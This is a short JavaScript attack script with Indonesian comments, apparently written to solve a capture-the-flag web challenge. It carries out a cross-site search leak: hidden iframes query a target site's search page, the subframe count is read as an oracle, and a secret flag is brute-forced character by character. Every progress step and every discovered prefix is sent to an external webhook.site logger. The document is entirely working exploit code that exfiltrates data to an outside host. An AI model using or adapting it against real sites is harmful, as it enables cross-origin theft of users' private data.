<script>
const TARGET = "https://wonder.cbd2026.cloud/search?q=";
const LOGGER = "https://webhook.site/YOUR-ID";

// charset flag (biasanya gini di CTF)
const ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_";

function check(q) {
  return new Promise(resolve => {
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';

    iframe.onload = () => {
      // trick: kalau ada result → iframe lebih "berat"
      setTimeout(() => {
        try {
          // heuristic: jumlah subframe
          const len = iframe.contentWindow.length;
          resolve(len > 0);
        } catch {
          // SOP kena → fallback ke TRUE
          resolve(true);
        }
        iframe.remove();
      }, 500);
    };

    iframe.src = TARGET + encodeURIComponent(q);
    document.body.appendChild(iframe);
  });
}

async function solve(prefix) {
  fetch(`${LOGGER}?progress=${prefix}`);

  for (const c of ALPHABET) {
    const test = prefix + c;
    const ok = await check(test);

    if (ok) {
      fetch(`${LOGGER}?found=${test}`);

      if (c === '}') return;
      return solve(test);
    }
  }
}

// IMPORTANT: flag biasanya uppercase di challenge lo
solve("CBD{");
</script>
